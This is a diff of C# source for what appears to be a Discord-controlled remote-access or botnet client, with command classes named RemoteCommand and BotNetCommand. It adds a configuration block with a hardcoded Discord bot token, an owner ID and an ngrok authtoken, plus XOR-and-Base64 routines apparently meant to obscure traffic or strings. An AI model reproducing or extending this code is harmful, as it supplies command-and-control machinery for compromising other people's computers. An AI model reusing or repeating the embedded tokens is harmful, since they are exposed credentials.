@@ -17,13 +17,22 @@ namespace s1l14lx3
 {
     public static class Import
     {
-        //set your node.js server URL
-        public static string ServerURL = "https://d33bef2a-988e-4936-8e96-a9f342105860-00-101fii9h4bncx.picard.replit.dev";
-
+        //System Config
         public static string ID = "";
         public static string Webhook = "";
+        public static string ChannelID = "";
         public static string Dir = Directory.GetCurrentDirectory() + @"\";
         public static string MePath = Assembly.GetEntryAssembly().Location;
+        //end
+
+        //User Config
+        public static string GUILDID = "";                                                                               //discord server ID
+        public static string MainChannelID = "1216941003039051827";                                                      //discord server main channel ID
+        public static string MainChannelWebhook = "";                                                                    //Main channel Webhook
+        public static string DISCORDTOKEN = "MTEyODgwNzI0MjYwMzQ0NjMxMw.GProy8.C11W1HDWuPHUOJbsyrTz8dJVFKREaYKcAY2ew0";  //discord bot token
+        public static string PARENTUSERID = "1079923996176437319";                                                       //Your discord ID
+        public static string NGROKTOKEN = "2c4FnnPQmyuFksOp5egKx3KbSNT_5VqurkHB1Li5SnFPN1Tvw";                           //ngrok authtoken
+        //end
     }
     public class Tools
     {
@@ -37,18 +46,25 @@ namespace s1l14lx3
             };
             manualResetEventSlim.Wait();
         }
-        public static string DecompressData(byte[] compressedData)
+        public static string XOREncode(string rawData, byte key)
         {
-            using (MemoryStream compressedStream = new MemoryStream(compressedData))
-            using (MemoryStream decompressedStream = new MemoryStream())
+            byte[] raw = Encoding.UTF8.GetBytes(rawData);
+            byte[] data = new Byte[raw.Length];
+            for (int i = 0; i < raw.Length; i++)
             {
-                using (GZipStream gzipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
-                {
-                    gzipStream.CopyTo(decompressedStream);
-                }
-
-                return Encoding.UTF8.GetString(decompressedStream.ToArray());
+                data[i] = (byte)(raw[i] ^ key);
             }
+            return Convert.ToBase64String(data);
+        }
+        public static string XORDecode(string rawData, byte key)
+        {
+            byte[] raw = Convert.FromBase64String(rawData);
+            byte[] data = new Byte[raw.Length];
+            for (int i = 0; i < raw.Length; i++)
+            {
+                data[i] = (byte)(raw[i] ^ key);
+            }
+            return Encoding.UTF8.GetString(data);
         }
         public static string Base64Decode(string Encoded)
         {
@@ -69,19 +85,19 @@ namespace s1l14lx3
     {
         public string Command { get; set; }
         public string Option { get; set; }
-        public bool Roop { set; get; }
+        public int Roop { set; get; }
     }
     public class ALLRemoteCommand
     {
         public string Command { get; set; }
         public string Option { get; set; }
-        public bool Roop { set; get; }
+        public int Roop { set; get; }
     }
     public class BotNetCommand
     {
         public string Command { get; set; }
         public string Option { get; set; }
-        public bool Roop { set; get; }
+        public int Roop { set; get; }
     }
     public class FileIoRes
     {
